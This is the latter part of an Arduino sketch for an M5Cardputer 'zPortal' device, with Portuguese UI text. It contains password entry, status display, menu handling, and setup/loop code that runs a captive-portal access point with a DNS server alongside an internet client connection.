  String displayPassword = "";
  for(int i = 0; i < newPassword.length(); i++) displayPassword += "*";
  DISP.printf("%s", displayPassword.c_str());
  
  bool confirmed = false;

  while(!confirmed){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del && newPassword.length() > 0) {
        newPassword.remove(newPassword.length() - 1);
      }
      if(status.enter) {
        confirmed = true;
      }
      if(newPassword.length() < 64) {
        for(auto i : status.word) {
          if(i != '\n' && i != '\r') {
            newPassword += i;
          }
        }
      }
      DISP.fillRect(0, cursorY, DISP.width(), DISP.height() - cursorY, BLACK);
      DISP.setCursor(0, cursorY);
      
      // Atualizar display com asteriscos
      displayPassword = "";
      for(int i = 0; i < newPassword.length(); i++) displayPassword += "*";
      DISP.printf("%s", displayPassword.c_str());
    }
  }

  if(newPassword.length() > 0){
    internetPassword = newPassword;
    showStatus("SENHA WIFI CLIENTE\nALTERADA!\nReconectando...");
    connectToInternet();
    delay(2000);
  }
}

void showSystemStatus() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("=== STATUS SISTEMA ===");
  DISP.printf("Portal: %s\n", portalTitle.c_str());
  DISP.printf("SSID Portal: %s\n", portalSSID.c_str());
  DISP.printf("URL: %s\n", portalURL.substring(0, 20).c_str());
  DISP.printf("WiFi Cliente: %s\n", internetSSID.c_str());
  DISP.printf("Internet: %s\n", internetConnected ? "CONECTADO" : "OFFLINE");
  DISP.printf("Acessos: %d\n", totalHits);
  DISP.printf("IP: %s\n", AP_IP.toString().c_str());
  DISP.println("======================");
  DISP.setTextSize(TINY_TEXT);
  DISP.println("Qualquer tecla para voltar");
  
  while(true) {
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      break;
    }
    delay(50);
  }
}

void handleMenu() {
  bool inMenu = true;
  showMenu();

  while(inMenu) {
    M5Cardputer.update();
    
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      
      for(auto i : status.word) {
        switch(i) {
          case '1':
            configPortalTitle();
            showMenu();
            break;
          case '2':
            configPortalSSID();
            showMenu();
            break;
          case '3':
            configPortalURL();
            showMenu();
            break;
          case '4':
            configWifiSSID();
            showMenu();
            break;
          case '5':
            configWifiPassword();
            showMenu();
            break;
          case '6':
            showStatus("REINICIANDO...");
            delay(1000);
            ESP.restart();
            break;
          case '7':
            showSystemStatus();
            showMenu();
            break;
          case '8':
            inMenu = false;
            printHomeScreen();
            break;
        }
      }
    }
    delay(50);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  
  portalHost.replace("https://", "");
  portalHost.replace("http://", "");
  
  auto cfg = M5.config();
  M5Cardputer.begin(cfg);
  DISP.setRotation(1);
  DISP.setTextWrap(true);

  // Tela de boas-vindas
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(" zPortal ");
  DISP.setTextSize(SMALL_TEXT);
  DISP.println("Iniciando...");
  delay(2000);
  
  // Conectar à internet
  connectToInternet();
  
  // Configurar AP
  setupWiFi();
  setupWebServer();
  
  printHomeScreen();
}

void loop() {
  M5Cardputer.update();
  
  // Processar DNS e WebServer
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // Verificar teclas de controle
  if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
    for(auto i : status.word) {
      if(i == 'r' || i == 'R') {
        connectToInternet();
        printHomeScreen();
      }
      if(i == 'm' || i == 'M') {
        handleMenu();
      }
    }
  }
  
  delay(10);
}